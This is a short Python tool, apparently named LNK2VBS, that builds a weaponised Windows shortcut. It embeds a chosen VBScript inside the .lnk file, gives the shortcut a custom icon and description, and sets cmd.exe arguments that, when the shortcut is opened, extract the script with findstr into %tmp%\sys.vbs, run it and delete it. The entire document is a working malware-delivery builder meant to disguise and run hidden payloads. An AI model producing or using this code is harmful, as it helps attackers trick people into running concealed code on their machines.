# Author: https://twitter.com/knight0x07

import os, sys, random, string
import winshell

print(
'''

.__          __   ________       ___.           
|  |   ____ |  | _\_____  \___  _\_ |__   ______
|  |  /    \|  |/ //  ____/\  \/ /| __ \ /  ___/
|  |_|   |  \    </       \ \   / | \_\ \\___ \ 
|____/___|  /__|_ \_______ \ \_/  |___  /____  >
          \/     \/       \/          \/     \/ 

''')

lnk_filename = input("\n  [+] LNK Name: ") + ".lnk"
lnk_filepath = os.getcwd() + "\\" + lnk_filename
lnk_description = input("  [+] LNK Description: ")
lnk_icon = input("  [+] LNK Icon Location: ")
lnk_id_no = random.randint(5, 15)
lnk_identifier = ":" * lnk_id_no
vbs_name = input("  [+] Target VBS: ")

with winshell.shortcut(lnk_filepath) as lnk:
  lnk.path = "C:\Windows\System32\cmd.exe"
  lnk.icon_location = lnk_icon, 0
  lnk.description = lnk_description
  lnk.arguments = "/v:on /c findstr \"" + lnk_identifier + ".*\" " + '"' + lnk_filename+ '"' + " > \"%tmp%\sys.vbs\" & \"%tmp%\sys.vbs\" & del \"%tmp%\sys.vbs\" "
try:
    with open(vbs_name, "r") as input:

        with open(lnk_filename, "a") as output:
              
            output.write("\n" + lnk_identifier + ":::")
            for line in input:
                line = line.strip()
                output.write(line)
                output.write(":::")
except OSError as e:
        print("  [-] Invalid Target VBS Name")
        exit()

print("  [+] LNK2VBS Generated")            
